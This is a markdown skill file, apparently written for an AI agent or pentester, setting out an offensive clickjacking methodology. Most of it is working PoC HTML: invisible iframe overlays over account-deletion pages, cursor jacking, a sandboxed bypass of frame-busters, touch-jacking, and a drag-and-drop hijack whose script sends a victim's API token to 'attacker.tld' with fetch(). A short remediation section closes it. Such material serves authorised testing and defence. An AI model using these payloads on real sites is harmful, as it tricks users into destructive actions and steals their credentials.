---
name: offensive-clickjacking
description: "Clickjacking / UI-redress methodology when X-Frame-Options is missing and CSP frame-ancestors is absent or wildcarded. Covers transparent overlays, opacity tricks, partial cursor jacking, drag-and-drop hijack, double-iframe bypasses for naive frame-busters, mobile touch-jacking, and the four canonical PoC HTML shapes."
---

# Clickjacking (UI Redress) — Offensive Methodology

## Quick Workflow

1. Confirm the target is framable (`X-Frame-Options` absent + CSP `frame-ancestors` absent or `*`).
2. Pick the user action with the highest impact (delete account, transfer funds, change email, grant permission).
3. Choose the overlay shape: transparent fullscreen, button overlay, partial cursor jack, or drag-and-drop.
4. Build the PoC HTML, host it on attacker-controlled origin.
5. Validate: load the PoC, hover over your decoy element, confirm the click reaches the framed action.

---

## Detection — Is the Target Framable?

```bash
# 1. Header probe
curl -skI https://target.tld/ | grep -iE 'x-frame-options|content-security-policy'

# 2. Live frame test (open in browser, watch DevTools console for refusals)
cat > /tmp/frame_probe.html <<'HTML'
<!doctype html><html><body>
<iframe src="https://target.tld/" width=600 height=400></iframe>
</body></html>
HTML
```

Refusal signals (NOT framable):

* `X-Frame-Options: DENY` → never framable
* `X-Frame-Options: SAMEORIGIN` → framable only from the same origin
* `CSP: frame-ancestors 'none'` → never framable (modern browsers honour this over XFO)
* `CSP: frame-ancestors 'self'` → same-origin only
* JS frame-buster (`if (top !== self) top.location = self.location`) — bypassable, see below.

If both XFO and CSP frame-ancestors are missing, the page is universally framable.

---

## Exploitation Shapes

### 1. Transparent Full-Page Overlay

The framed target sits at 0.0001 opacity over a clickable decoy. The victim
sees only the decoy; the click lands on the real button inside the iframe.

```html
<style>
  iframe { position:absolute; top:0; left:0; width:100%; height:100%;
           opacity:0.0001; z-index:2; border:none; }
  .decoy { position:absolute; top:200px; left:400px; padding:20px 40px;
           background:#2ed573; color:#fff; font-size:24px; cursor:pointer; }
</style>
<button class="decoy">Claim Your Free iPhone</button>
<iframe src="https://target.tld/account/delete"></iframe>
```

Tune `top`/`left` so the decoy lands exactly over the dangerous button inside
the framed page. Use the browser's element inspector on the live target to
measure pixel coordinates.

### 2. Cursor Jacking (Mouse-Cursor Overlay)

Replace the browser cursor with a fake offset cursor so the user clicks 100px
away from where they think.

```html
<style>
  html, body { cursor: none; }
  #fakecursor { position:fixed; pointer-events:none; z-index:99; width:20px; }
</style>
<img id="fakecursor" src="cursor.png">
<iframe src="https://target.tld/admin/delete" style="position:absolute;top:0;left:120px"></iframe>
<script>
  document.addEventListener('mousemove', e => {
    document.getElementById('fakecursor').style.top  = e.clientY + 'px';
    document.getElementById('fakecursor').style.left = (e.clientX - 120) + 'px';
  });
</script>
```

### 3. Drag-and-Drop Hijack (Data Exfil)

The victim drags a "fun puzzle piece" — but the drag actually originates from a
sensitive input inside the iframe (e.g. an OAuth token text field). Browser's
drag-and-drop API transfers the source text to your drop target.

```html
<iframe src="https://target.tld/account/api-token" id="t"
        style="opacity:0.001;position:absolute;top:0;left:0;width:600px;height:400px;z-index:2"></iframe>
<div id="dropzone" style="position:absolute;top:300px;left:150px;width:200px;height:100px;background:#ffe">
  Drag here to win!
</div>
<script>
  document.getElementById('dropzone').addEventListener('drop', e => {
    fetch('https://attacker.tld/stolen?d=' + encodeURIComponent(e.dataTransfer.getData('text')));
  });
</script>
```

### 4. Double-Iframe — Frame-Buster Bypass

Naive JS frame-busters check `top !== self`. Wrapping the target in a
sandboxed iframe disables top-frame navigation, neutering the bust.

```html
<iframe src="data:text/html,<iframe src=https://target.tld/dangerous></iframe>"
        sandbox="allow-scripts allow-forms"></iframe>
```

`sandbox="allow-scripts allow-forms"` — *omit* `allow-top-navigation`. The
inner page's `top.location = ...` becomes a no-op.

### 5. Mobile Touch-Jacking

On mobile the user can't easily inspect overlay. Use a tap-and-hold to trigger
context-menu-driven exfil:

```html
<iframe src="https://target.tld/share-secret"
        style="opacity:0.001;position:fixed;inset:0;width:100vw;height:100vh"></iframe>
<div style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;font-size:32px">
  Tap to continue
</div>
```

---

## Frame-Buster Bypass Tricks

| Buster pattern | Bypass |
|---|---|
| `if (top !== self) top.location = self.location` | `sandbox` without `allow-top-navigation` |
| `if (self !== top) document.body.style.display='none'` | Override CSS: `<style>body{display:block!important}</style>` injected via XSS, OR use partial iframe |
| `try { if (top.location.host !== self.location.host) top.location = self.location } catch (e) {}` | Cross-origin already throws — wrap in `sandbox` so the catch swallows it |

---

## Defences You Are Testing Against

* `X-Frame-Options: DENY` or `SAMEORIGIN` — legacy but still respected
* CSP `frame-ancestors 'none'` (or specific origins) — preferred modern defence
* JS frame-busters — easy to bypass, treat as no protection
* `Cross-Origin-Opener-Policy: same-origin` — does NOT prevent framing
* `SameSite=Strict` on session cookies — partial mitigation (cross-site framed
  requests won't send the session); combine with CSRF/clickjacking together

---

## Remediation (for the report)

```http
Content-Security-Policy: frame-ancestors 'none';
X-Frame-Options: DENY
```

For pages that legitimately need to be embedded by a specific partner:

```http
Content-Security-Policy: frame-ancestors https://partner.tld;
```

Never rely on `X-Frame-Options: ALLOW-FROM <uri>` — most browsers ignore it.
